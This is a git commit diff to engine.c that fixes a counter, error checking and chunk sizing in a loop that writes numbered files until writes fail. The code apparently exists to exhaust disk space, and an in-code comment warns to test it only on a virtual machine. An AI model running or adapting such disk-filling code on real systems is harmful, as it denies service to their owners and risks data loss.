eb7cb456cc4c4acd5c9e41e9765354dc4fa16637
DaniilAev <daniilaev415@gmail.com>
2026-09-22 16:12:34 +0300

    fix: file counter in engine

--- engine.c
+++ engine.c
@@ -2,17 +2,17 @@
 #include <stdlib.h>
 #include "engine.h"
 
-char filename[128] = "0";
+char filename[128] = "\0";
 int engine(){
     char filename[128] = "\0";
     int result_of_test;
-    int files_counter;
+    int files_counter = 0;
     int result_of_writing = 0;
-    long size_of_file = 32768;
+    long size_of_file = 32768; //TEMP
     char *space;
     FILE* file;
-    result_of_test = test();
 
+    result_of_test = test();
     if (result_of_test != 0){
         return result_of_test;
     }
@@ -24,10 +24,11 @@ int engine(){
             abort(); // Delete for testing. TEST ONLY ON VIRTUAL MACHINE!
             sprintf(filename, "%d", files_counter++);
             file = fopen(filename, "w");
-            result_of_writing = fwrite(space, sizeof(char), size_of_file, file);
+            fwrite(space, sizeof(char), size_of_file, file);
+            result_of_writing = fflush(file);
             fclose(file);
             if (result_of_writing != 0){
-                size_of_file <<= 1;
+                size_of_file >>= 1;
             }
     }
 
